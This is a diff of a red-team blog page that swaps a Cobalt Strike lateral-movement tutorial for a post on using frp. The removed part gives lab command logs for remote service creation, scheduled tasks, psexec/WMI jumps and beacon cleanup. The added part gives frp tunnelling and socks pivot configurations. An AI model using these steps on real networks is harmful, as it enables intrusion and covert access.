@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【CS学习笔记】19、代码执行的方式, Teams Six">
+    <meta name="keywords" content="【内网学习笔记】11、frp 的使用, Teams Six">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>【CS学习笔记】19、代码执行的方式 | Teams Six</title>
+    <title>【内网学习笔记】11、frp 的使用 | Teams Six</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -258,12 +258,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-2.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609155435.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【CS学习笔记】19、代码执行的方式</h1>
+                    <h1 class="description center-align post-title">【内网学习笔记】11、frp 的使用</h1>
                 </div>
             </div>
         </div>
@@ -380,16 +380,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Cobalt-Strike/">
-                                <span class="chip bg-color">Cobalt Strike</span>
-                            </a>
-                        
                             <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                 <span class="chip bg-color">学习笔记</span>
                             </a>
                         
                             <a href="/tags/%E7%BA%A2%E9%98%9F/">
                                 <span class="chip bg-color">红队</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
                             </a>
                         
                     </div>
@@ -400,8 +400,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                内网学习笔记
                             </a>
                         
                     </div>
@@ -413,28 +413,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-19
+                    2021-06-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-04
+                    2021-06-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    946
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    4 分
                 </div>
                 
 
@@ -449,141 +449,81 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>实现代码执行的四个步骤：</p>
-<p>1、与目标建立信任关系</p>
-<p>2、复制可执行文件到目标上</p>
-<p>3、在目标上运行可执行文件</p>
-<p>4、实现对目标的控制</p>
-<p>以上是根据视频教程中直译的结果，个人感觉其实这一节叫<code>横向移动的方法</code>更为合适。</p>
-<h1 id="0x01-创建可执行文件"><a href="#0x01-创建可执行文件" class="headerlink" title="0x01 创建可执行文件"></a>0x01 创建可执行文件</h1><p>创建可执行文件可以在 Cobalt Strike 的 <code>Attack -&gt; Packages -&gt; Windows Executable(s)</code> 处进行创建。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-1.png"></p>
-<p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。</p>
-<h1 id="0x02-上传可执行文件"><a href="#0x02-上传可执行文件" class="headerlink" title="0x02 上传可执行文件"></a>0x02 上传可执行文件</h1><p>首先使用 Cobalt Strike 上的 <code>upload</code> 功能上传文件，接着复制文件到目标主机的其他位置。</p>
-<pre><code class="powershell">shell copy file.exe \\host\C$\Windows\Temp</code></pre>
-<pre><code class="powershell">beacon&gt; upload /root/beacon.exe
-[*] Tasked beacon to upload /root/Desktop/beacon.exe as beacon.exe
-[+] host called home, sent: 289302 bytes
-
-beacon&gt; shell copy beacon.exe \\WinTest\C$\Windows\Temp
-[*] Tasked beacon to run: copy beacon.exe \\WinTest\C$\Windows\Temp
-[+] host called home, sent: 72 bytes
-[+] received output:
-已复制         1 个文件。</code></pre>
-<h1 id="0x03-执行文件（方法一）"><a href="#0x03-执行文件（方法一）" class="headerlink" title="0x03 执行文件（方法一）"></a>0x03 执行文件（方法一）</h1><p>1、生成 Windows Service EXE 并上传</p>
-<p>2、在目标主机上创建一个服务</p>
-<pre><code class="powershell">shell sc \\host create name binpath= c:\windows\temp\file.exe</code></pre>
-<pre><code class="powershell">beacon&gt; shell sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe
-[*] Tasked beacon to run: sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe
-[+] host called home, sent: 93 bytes
-[+] received output:
-[SC] CreateService 成功</code></pre>
+                <h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。</p>
+<p>在实战中，大家较多使用的也是 frp，frp 项目地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p>至于下载安装直接在项目的 releases 里下载自己对应的系统版本就行。</p>
+<h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>官方使用文档：<a target="_blank" rel="noopener" href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p>
+<p>frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别对应 frps.ini 和 frpc.ini</p>
 <blockquote>
-<p>注：记住 binpath 路径</p>
+<p>以下环境均为本地环境，VPS IP 为 172.16.214.52，目标主机 IP 为 192.168.7.110</p>
 </blockquote>
-<p>3、在目标主机上启动服务</p>
-<pre><code class="powershell">shell sc \\host start name</code></pre>
-<pre><code class="powershell">beacon&gt; shell sc \\wintest start beacon
-[*] Tasked beacon to run: sc \\wintest start beacon
-[+] host called home, sent: 56 bytes
-[+] received output:
-SERVICE_NAME: beacon 
-        TYPE               : 10  WIN32_OWN_PROCESS  
-        STATE              : 2  START_PENDING 
-                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
-        CHECKPOINT         : 0x0
-        WAIT_HINT          : 0x7d0
-        PID                : 3816
-        FLAGS              : 
+<h3 id="a、内网端口穿透"><a href="#a、内网端口穿透" class="headerlink" title="a、内网端口穿透"></a>a、内网端口穿透</h3><p> 场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p>
+<p>在 VPS 上开启服务端，这里以 kali 为例，首先修改配置文件 frps.ini</p>
+<pre><code>[common]
+bind_port = 4444</code></pre>
+<p>然后启动服务端</p>
+<pre><code>frps -c frps.ini</code></pre>
+<pre><code>&gt; ./frps -c frps.ini
+2021/06/09 03:45:03 [I] [root.go:200] frps uses config file: frps.ini
+2021/06/09 03:45:03 [I] [service.go:192] frps tcp listen on 0.0.0.0:4444
+2021/06/09 03:45:03 [I] [root.go:209] frps started successfully</code></pre>
+<p>配置客户端配置文件</p>
+<pre><code>[common]
+# 服务端 IP
+server_addr = vps_ip
+# 服务端端口
+server_port = 4444
 
-beacon&gt; link wintest
-[*] Tasked to link to \\wintest\pipe\msagent_da00
-[+] host called home, sent: 36 bytes
-[+] established link to child beacon: 192.168.175.130</code></pre>
-<p>4、清除痕迹与服务</p>
-<pre><code>shell sc \\host delete name</code></pre>
-<pre><code class="powershell">beacon&gt; shell del beacon.exe
-[*] Tasked beacon to run: del beacon.exe
-[+] host called home, sent: 57 bytes
+[rdp]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 3389
+# 连接 vps 的端口
+remote_port = 3389</code></pre>
+<pre><code>&gt; .\frpc.exe -c frpc.ini
+2021/06/09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]
+2021/06/09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]
+2021/06/09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success</code></pre>
+<p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609155435.png"></p>
+<h3 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p>
+<p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p>
+<p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p>
+<p>在 VPS 上开启服务端，服务端配置文件如下：</p>
+<pre><code>[common]
+bind_port = 4444
 
-beacon&gt; shell del \\wintest\C$\windows\temp\beacon.exe
-[*] Tasked beacon to run: del \\wintest\C$\windows\temp\beacon.exe
-[+] host called home, sent: 83 bytes
+# 客户端认证 token
+token = 123456
 
-beacon&gt; shell sc \\wintest delete beacon
-[*] Tasked beacon to run: sc \\wintest delete beacon
-[+] host called home, sent: 69 bytes
-[+] received output:
-[SC] DeleteService 成功</code></pre>
-<h1 id="0x04-执行文件（方法二）"><a href="#0x04-执行文件（方法二）" class="headerlink" title="0x04 执行文件（方法二）"></a>0x04 执行文件（方法二）</h1><p>1、生成 Windows EXE 并上传，注意这里生成的 EXE 和<code>方法一</code>生成的 EXE 是不一样的类型，这里生成的是<code> Windows EXE</code>，不是方法一中的<code>Windows Service EXE</code></p>
-<p>2、找到目标系统上的时间</p>
-<pre><code class="powershell">shell net time \\host</code></pre>
-<pre><code class="powershell">beacon&gt; shell net time \\windc
-[*] Tasked beacon to run: net time \\windc
-[+] host called home, sent: 49 bytes
-[+] received output:
-\\windc 的当前时间是 2020/8/30 14:54:09
-命令成功完成。</code></pre>
-<p>3、创建一个计划任务</p>
-<pre><code class="powershell">shell at \\host HH:mm C:\path\to\bad.exe</code></pre>
-<pre><code class="powershell">beacon&gt; shell at \\windc 15:00 C:\windows\temp\beacon.exe
-[*] Tasked beacon to run: at \\windc 15:00 C:\windows\temp\beacon.exe
-[+] host called home, sent: 76 bytes
-[+] received output:
-新加了一项作业，其作业 ID = 1</code></pre>
-<p>4、当计划任务被执行时，执行 link hostname 即可上线主机</p>
-<pre><code class="powershell">beacon&gt; link windc
-[*] Tasked to link to \\windc\pipe\msagent_d76a
-[+] host called home, sent: 34 bytes
-[+] established link to child beacon: 192.168.175.144</code></pre>
-<h1 id="0x05-beacon-的自动操作"><a href="#0x05-beacon-的自动操作" class="headerlink" title="0x05 beacon 的自动操作"></a>0x05 beacon 的自动操作</h1><p>前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。</p>
-<ul>
-<li>使用一个服务运行可执行文件</li>
-</ul>
-<pre><code class="powershell">psexec [target] [share] [listener]</code></pre>
-<ul>
-<li>使用一个服务运行 Powershell 单行程序</li>
-</ul>
-<pre><code class="powershell">psexec_psh [target] [listener]</code></pre>
-<ul>
-<li>通过 WinRM 运行 Powershell 单行程序</li>
-</ul>
-<pre><code class="powershell">winrm [target] [listener]</code></pre>
-<ul>
-<li>通过 WMI 运行 Powershell 单行程序</li>
-</ul>
-<pre><code class="powershell">wmi [target] [listener]</code></pre>
-<p>在 Cobalt Strike 的 <code>viwe --&gt; Targets</code> 下，右击主机选择 <code>Jump</code> 也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。</p>
-<p>接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 <code>net view</code> 查看一下当前域环境中的主机信息。</p>
-<pre><code class="powershell">beacon&gt; net view
-[*] Tasked beacon to run net view
-[+] host called home, sent: 104504 bytes
-[+] received output:
-List of hosts:
-[+] received output:
- Server Name             IP Address                       Platform  Version  Type   Comment
- -----------             ----------                       --------  -------  ----   -------            
- WINDC                   192.168.175.144                  500       6.1      PDC    
- WINTEST                 192.168.175.130                  500       6.1         </code></pre>
-<p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p>
-<pre><code class="powershell">beacon&gt; powershell-import PowerView.ps1
-[*] Tasked beacon to import: PowerView.ps1
-[+] host called home, sent: 101224 bytes
-
-beacon&gt; powershell Find-LocalAdminAccess
-[*] Tasked beacon to run: Find-LocalAdminAccess
-[+] host called home, sent: 329 bytes
-[+] received output:
-WinDC.teamssix.com</code></pre>
-<p>接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌。</p>
-<p>这里笔者认为应该是因为当前在 wintest 主机上有 windc 的管理员账户登录着，所以使用 wintest 的访问令牌是可以获取 windc 的信任的，类似于 <a target="_blank" rel="noopener" href="https://teamssix.com/year/200419-150622.html">CS 学习笔记 17 节</a>里的描述方法，如有不正确之处，还请多多指教。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-2.png"></p>
-<p>之后，windc 主机就上线了，域中如果还有其他主机，也可以使用这种方法去横向移动。</p>
+# 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码
+dashboard_port = 8000
+dashboard_user = admin
+dashboard_pwd = password</code></pre>
 <blockquote>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p>
+<p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p>
+</blockquote>
+<p>配置好文件后，启动服务端</p>
+<pre><code>frps -c frps.ini</code></pre>
+<pre><code>./frps -c frps.ini
+2021/06/09 04:06:34 [I] [root.go:200] frps uses config file: frps.ini
+2021/06/09 04:06:35 [I] [service.go:192] frps tcp listen on 0.0.0.0:4444
+2021/06/09 04:06:35 [I] [service.go:294] Dashboard listen on 0.0.0.0:8000
+2021/06/09 04:06:35 [I] [root.go:209] frps started successfully</code></pre>
+<p>配置客户端文件</p>
+<pre><code>[common]server_addr = vps_ipserver_port = 4444# 客户端认证 token，需要和服务端 token 保持一致token = 123456# 启用加密，防止流量被拦截use_encryption = true# 启用压缩，提升流量转发速度use_compression = true[socks5]type = tcp# 连接 vps 的端口remote_port = 1080plugin = socks5</code></pre>
+<p>开启客户端</p>
+<pre><code>frpc -c frpc.ini</code></pre>
+<pre><code>&gt; .\frpc.exe -c frpc.ini2021/06/09 16:11:21 [I] [service.go:304] [ee7ad330ab4e6036] login to server success, get run id [ee7ad330ab4e6036], server udp port [0]2021/06/09 16:11:21 [I] [proxy_manager.go:144] [ee7ad330ab4e6036] proxy added: [socks5]2021/06/09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success</code></pre>
+<p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161458.png"></p>
+<p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161859.png"></p>
+<p>frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。</p>
+<blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
@@ -612,7 +552,7 @@ WinDC.teamssix.com</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/year/200419-150637.html">https://www.teamssix.com/year/200419-150637.html</a>
+                    <a href="https://www.teamssix.com/year/210611-171526.html">https://www.teamssix.com/year/210611-171526.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -650,16 +590,16 @@ WinDC.teamssix.com</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Cobalt-Strike/">
-                                    <span class="chip bg-color">Cobalt Strike</span>
-                                </a>
-                            
                                 <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                     <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
                                 <a href="/tags/%E7%BA%A2%E9%98%9F/">
                                     <span class="chip bg-color">红队</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
                                 </a>
                             
                         </div>
@@ -705,7 +645,7 @@ WinDC.teamssix.com</code></pre>
         owner: 'teamssix',
         proxy: 'https://shielded-brushlands-08810.herokuapp.com/https://github.com/login/oauth/access_token',
         admin: "teamssix",
-        id: '2020-04-19T15-06-37',
+        id: '2021-06-11T17-15-26',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -729,46 +669,45 @@ WinDC.teamssix.com</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/200419-150644.html">
+                <a href="/year/210611-171526.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs20-1.png" class="responsive-img" alt="【CS学习笔记】20、通过Socks转发的方法">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609155435.png" class="responsive-img" alt="【内网学习笔记】11、frp 的使用">
                         
-                        <span class="card-title">【CS学习笔记】20、通过Socks转发的方法</span>
+                        <span class="card-title">【内网学习笔记】11、frp 的使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这一小节中，将看看如何构建一个 SOCKS 代理服务器使一个上线主机变成我们的跳板机。
+                            1、介绍相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。
+在实战中，大家较多使用的也是 frp，frp 项目地址：https://github.com/fatedier
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
-                    </a>
                     
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
@@ -776,6 +715,10 @@ WinDC.teamssix.com</code></pre>
                     
                     <a href="/tags/%E7%BA%A2%E9%98%9F/">
                         <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
@@ -789,30 +732,32 @@ WinDC.teamssix.com</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/200419-150630.html">
+                <a href="/year/210610-164507.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs18-1.png" class="responsive-img" alt="【CS学习笔记】18、密码哈希散列设置信任">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png" class="responsive-img" alt="【内网学习笔记】10、ew 的使用">
                         
-                        <span class="card-title">【CS学习笔记】18、密码哈希散列设置信任</span>
+                        <span class="card-title">【内网学习笔记】10、ew 的使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            继续上一节密码哈希的部分，在上一节中讲到了使用密码生成用户的令牌，从而取得系统的信任，这一节将介绍使用密码的哈希值来取得系统的信任。
+                            1、Socks 代理工具介绍Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：
+https://teamssix.com/year/210528-130449.html
+但是 lcx 毕竟年代久远，现在的杀
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
@@ -822,16 +767,16 @@ WinDC.teamssix.com</code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
-                    </a>
-                    
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
                     </a>
                     
                     <a href="/tags/%E7%BA%A2%E9%98%9F/">
                         <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
